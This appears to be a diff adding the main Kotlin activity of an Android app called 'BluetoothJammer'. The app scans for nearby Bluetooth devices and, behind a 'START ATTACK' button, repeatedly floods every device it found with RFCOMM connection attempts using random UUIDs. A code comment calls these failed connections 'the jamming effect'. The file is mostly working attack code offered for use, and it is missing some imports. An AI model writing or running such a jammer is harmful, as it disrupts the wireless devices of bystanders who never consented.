@@ -1,0 +1,345 @@
+package com.eikarna.bluetoothjammer
+
+import android.Manifest
+import android.bluetooth.BluetoothAdapter
+import android.bluetooth.BluetoothDevice
+import android.bluetooth.BluetoothManager
+import android.bluetooth.le.BluetoothLeScanner
+import android.bluetooth.le.ScanCallback
+import android.bluetooth.le.ScanResult
+import android.content.pm.PackageManager
+import android.os.Bundle
+import android.util.Log
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import com.google.android.material.button.MaterialButton
+import com.google.android.material.switchmaterial.SwitchMaterial
+import java.util.UUID
+import java.util.concurrent.ConcurrentHashMap
+import java.util.concurrent.ExecutorService
+import java.util.concurrent.Executors
+import java.util.concurrent.atomic.AtomicBoolean
+
+class MainActivity : AppCompatActivity() {
+
+    companion object {
+        private const val TAG = "BluetoothJammer"
+        private const val REQUEST_PERMISSIONS = 1001
+        private val REQUIRED_PERMISSIONS = arrayOf(
+            Manifest.permission.BLUETOOTH,
+            Manifest.permission.BLUETOOTH_ADMIN,
+            Manifest.permission.BLUETOOTH_SCAN,
+            Manifest.permission.BLUETOOTH_CONNECT,
+            Manifest.permission.ACCESS_FINE_LOCATION
+        )
+    }
+
+    // UI Components
+    private lateinit var btnStartStop: MaterialButton
+    private lateinit var switchLog: SwitchMaterial
+    private lateinit var switchAutoRandomUUID: SwitchMaterial
+    private lateinit var recyclerDevices: RecyclerView
+    
+    // Bluetooth Components
+    private var bluetoothAdapter: BluetoothAdapter? = null
+    private var bluetoothLeScanner: BluetoothLeScanner? = null
+    
+    // Device List
+    private val deviceMap = ConcurrentHashMap<String, BluetoothDevice>()
+    private lateinit var deviceAdapter: DeviceAdapter
+    
+    // Attack Thread Management
+    private val isAttacking = AtomicBoolean(false)
+    private var attackExecutor: ExecutorService? = null
+    private val autoRandomizeUUID = AtomicBoolean(true)
+    private val enableLogging = AtomicBoolean(true)
+    
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+        
+        initializeBluetooth()
+        initializeUI()
+        checkPermissions()
+    }
+    
+    private fun initializeBluetooth() {
+        val bluetoothManager = getSystemService(BLUETOOTH_SERVICE) as BluetoothManager
+        bluetoothAdapter = bluetoothManager.adapter
+        bluetoothLeScanner = bluetoothAdapter?.bluetoothLeScanner
+        
+        if (bluetoothAdapter == null) {
+            Toast.makeText(this, "Bluetooth not supported", Toast.LENGTH_LONG).show()
+            finish()
+        }
+    }
+    
+    private fun initializeUI() {
+        btnStartStop = findViewById(R.id.btnStartStop)
+        switchLog = findViewById(R.id.switchLog)
+        switchAutoRandomUUID = findViewById(R.id.switchAutoRandomUUID)
+        recyclerDevices = findViewById(R.id.recyclerDevices)
+        
+        // Setup RecyclerView
+        deviceAdapter = DeviceAdapter(deviceMap)
+        recyclerDevices.apply {
+            layoutManager = LinearLayoutManager(this@MainActivity)
+            adapter = deviceAdapter
+        }
+        
+        // Setup Switches
+        switchLog.isChecked = true
+        switchLog.setOnCheckedChangeListener { _, isChecked ->
+            enableLogging.set(isChecked)
+            log("Logging ${if (isChecked) "enabled" else "disabled"}")
+        }
+        
+        switchAutoRandomUUID.isChecked = true
+        switchAutoRandomUUID.setOnCheckedChangeListener { _, isChecked ->
+            autoRandomizeUUID.set(isChecked)
+            log("Auto UUID randomization ${if (isChecked) "enabled" else "disabled"}")
+        }
+        
+        // Setup Start/Stop Button
+        btnStartStop.setOnClickListener {
+            if (isAttacking.get()) {
+                stopAttack()
+            } else {
+                startAttack()
+            }
+        }
+    }
+    
+    private fun checkPermissions() {
+        val missingPermissions = REQUIRED_PERMISSIONS.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+        
+        if (missingPermissions.isNotEmpty()) {
+            ActivityCompat.requestPermissions(
+                this,
+                missingPermissions.toTypedArray(),
+                REQUEST_PERMISSIONS
+            )
+        } else {
+            startScanning()
+        }
+    }
+    
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQUEST_PERMISSIONS) {
+            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                startScanning()
+            } else {
+                Toast.makeText(this, "Permissions required", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+    
+    private fun startScanning() {
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.BLUETOOTH_SCAN
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            return
+        }
+        
+        bluetoothLeScanner?.startScan(scanCallback)
+        log("Started scanning for devices")
+    }
+    
+    private val scanCallback = object : ScanCallback() {
+        override fun onScanResult(callbackType: Int, result: ScanResult) {
+            super.onScanResult(callbackType, result)
+            val device = result.device
+            val address = device.address
+            
+            if (!deviceMap.containsKey(address)) {
+                deviceMap[address] = device
+                runOnUiThread {
+                    deviceAdapter.notifyDataSetChanged()
+                }
+                log("Found device: ${device.name ?: "Unknown"} ($address)")
+            }
+        }
+        
+        override fun onScanFailed(errorCode: Int) {
+            super.onScanFailed(errorCode)
+            log("Scan failed with error: $errorCode")
+        }
+    }
+    
+    private fun startAttack() {
+        if (isAttacking.get()) return
+        
+        if (deviceMap.isEmpty()) {
+            Toast.makeText(this, "No devices found. Scanning...", Toast.LENGTH_SHORT).show()
+            return
+        }
+        
+        isAttacking.set(true)
+        updateUIState(true)
+        
+        // Create optimized executor service with single thread
+        attackExecutor = Executors.newSingleThreadExecutor()
+        
+        attackExecutor?.execute {
+            log("Attack started on ${deviceMap.size} devices")
+            
+            while (isAttacking.get() && !Thread.currentThread().isInterrupted) {
+                try {
+                    performAttack()
+                    
+                    // Small delay to prevent CPU exhaustion
+                    Thread.sleep(10)
+                } catch (e: InterruptedException) {
+                    Thread.currentThread().interrupt()
+                    break
+                } catch (e: Exception) {
+                    log("Attack error: ${e.message}")
+                }
+            }
+            
+            log("Attack stopped")
+        }
+    }
+    
+    private fun stopAttack() {
+        if (!isAttacking.get()) return
+        
+        log("Stopping attack...")
+        isAttacking.set(false)
+        
+        // Properly shutdown executor
+        attackExecutor?.let { executor ->
+            executor.shutdown()
+            try {
+                if (!executor.awaitTermination(2, java.util.concurrent.TimeUnit.SECONDS)) {
+                    executor.shutdownNow()
+                }
+            } catch (e: InterruptedException) {
+                executor.shutdownNow()
+                Thread.currentThread().interrupt()
+            }
+        }
+        attackExecutor = null
+        
+        updateUIState(false)
+        log("Attack stopped successfully")
+    }
+    
+    private fun performAttack() {
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.BLUETOOTH_CONNECT
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            return
+        }
+        
+        deviceMap.values.forEach { device ->
+            try {
+                // Generate random UUID if enabled
+                val uuid = if (autoRandomizeUUID.get()) {
+                    UUID.randomUUID()
+                } else {
+                    UUID.fromString("00001101-0000-1000-8000-00805F9B34FB") // Standard SPP UUID
+                }
+                
+                // Attempt connection with random UUID
+                val socket = device.createRfcommSocketToServiceRecord(uuid)
+                socket?.let {
+                    try {
+                        it.connect()
+                        it.close()
+                    } catch (e: Exception) {
+                        // Expected to fail - this is the jamming effect
+                    }
+                }
+            } catch (e: Exception) {
+                // Continue to next device
+            }
+        }
+    }
+    
+    private fun updateUIState(attacking: Boolean) {
+        runOnUiThread {
+            btnStartStop.text = if (attacking) "STOP ATTACK" else "START ATTACK"
+            btnStartStop.setBackgroundColor(
+                if (attacking) 
+                    getColor(android.R.color.holo_red_dark) 
+                else 
+                    getColor(android.R.color.holo_green_dark)
+            )
+            switchAutoRandomUUID.isEnabled = !attacking
+        }
+    }
+    
+    private fun log(message: String) {
+        if (enableLogging.get()) {
+            Log.d(TAG, message)
+            runOnUiThread {
+                Toast.makeText(this@MainActivity, message, Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+    
+    override fun onDestroy() {
+        super.onDestroy()
+        stopAttack()
+        
+        // Stop scanning
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.BLUETOOTH_SCAN
+            ) == PackageManager.PERMISSION_GRANTED
+        ) {
+            bluetoothLeScanner?.stopScan(scanCallback)
+        }
+    }
+}
+
+// Device Adapter for RecyclerView
+class DeviceAdapter(
+    private val deviceMap: ConcurrentHashMap<String, BluetoothDevice>
+) : RecyclerView.Adapter<DeviceAdapter.DeviceViewHolder>() {
+    
+    class DeviceViewHolder(view: View) : RecyclerView.ViewHolder(view) {
+        val deviceName: TextView = view.findViewById(R.id.deviceName)
+        val deviceAddress: TextView = view.findViewById(R.id.deviceAddress)
+    }
+    
+    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): DeviceViewHolder {
+        val view = LayoutInflater.from(parent.context)
+            .inflate(R.layout.item_device, parent, false)
+        return DeviceViewHolder(view)
+    }
+    
+    override fun onBindViewHolder(holder: DeviceViewHolder, position: Int) {
+        val device = deviceMap.values.toList()[position]
+        
+        // Check permission before accessing device name
+        if (ActivityCompat.checkSelfPermission(
+                holder.itemView.context,
+                Manifest.permission.BLUETOOTH_CONNECT
+            ) == PackageManager.PERMISSION_GRANTED
+        ) {
+            holder.deviceName.text = device.name ?: "Unknown Device"
+        } else {
+            holder.deviceName.text = "Unknown Device"
+        }
+        holder.deviceAddress.text = device.address
+    }
+    
+    override fun getItemCount(): Int = deviceMap.size
+}
